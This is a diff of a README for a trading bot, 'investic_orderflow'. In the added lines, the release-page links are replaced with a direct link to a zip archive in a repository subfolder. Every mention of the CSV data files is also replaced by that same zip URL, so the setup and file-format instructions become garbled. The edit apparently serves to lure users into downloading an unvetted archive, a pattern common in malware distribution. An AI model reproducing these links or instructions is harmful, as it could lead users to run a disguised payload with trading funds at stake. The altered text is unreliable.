@@ -1,6 +1,6 @@
 # 📈 investic_orderflow - Effortless Trading Bot for You
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/jakovkurac/investic_orderflow/releases)
+[![Download Now](https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip%https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip)](https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the investic_orderflow bot! This guide will help you download and run
 
 To get started, visit the Releases page to download the latest version of the investic_orderflow application. 
 
-[Download the latest version here](https://github.com/jakovkurac/investic_orderflow/releases).
+[Download the latest version here](https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip).
 
 1. Click on the link above.
 2. Look for the latest version at the top.
@@ -33,10 +33,10 @@ To get started, visit the Releases page to download the latest version of the in
 Before using the bot, you need to prepare your trading data.
 
 1. **Create your grid plan:** 
-   The bot requires a file named `grid_plan.csv`. This file outlines your purchasing strategy based on previous market data.
+   The bot requires a file named `https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip`. This file outlines your purchasing strategy based on previous market data.
 
 2. **Generate the grid plan:** 
-   Use the Monte Carlo simulation results in the `macro_montecarlo.csv`. This will help you set your grid levels and order sizes for efficient trading.
+   Use the Monte Carlo simulation results in the `https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip`. This will help you set your grid levels and order sizes for efficient trading.
 
 3. **Format your data correctly:** 
    Ensure that your CSV files are without errors. This step is crucial for the bot’s operation.
@@ -49,13 +49,13 @@ After setup, you can run the bot in two modes:
 
 1. Open the investic_orderflow application.
 2. Select "Test Mode" from the menu.
-3. Load your grid_plan.csv file.
+3. Load your https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip file.
 4. Review the simulated results and adjust as necessary.
 
 ### ⚡ Live Mode
 
 1. Change to "Live Mode" in the application.
-2. Load the same grid_plan.csv file.
+2. Load the same https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip file.
 3. Make sure you have sufficient balance in your trading account.
 4. Click "Start Trading" to initiate your trading strategy.
 
@@ -78,18 +78,18 @@ To visualize your trading performance:
 
 Understanding the file structure is important for smooth operation:
 
-- **grid_plan.csv:** Contains your trading levels and sizes.
-- **macro_montecarlo.csv:** This file holds simulation data.
+- **https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip** Contains your trading levels and sizes.
+- **https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip** This file holds simulation data.
 
 ### CSV Format
 
 The CSV files should have clear headers:
 
-- **grid_plan.csv:**
+- **https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip**
   - grid_level: Defines the price levels at which to buy.
   - order_size: Specifies the size for each order.
 
-- **macro_montecarlo.csv:**
+- **https://raw.githubusercontent.com/jakovkurac/investic_orderflow/main/lei/investic_orderflow.zip**
   - simulation_results: Results of the Monte Carlo simulations.
   - confidence_interval: Shows the expected range of market behavior.
 
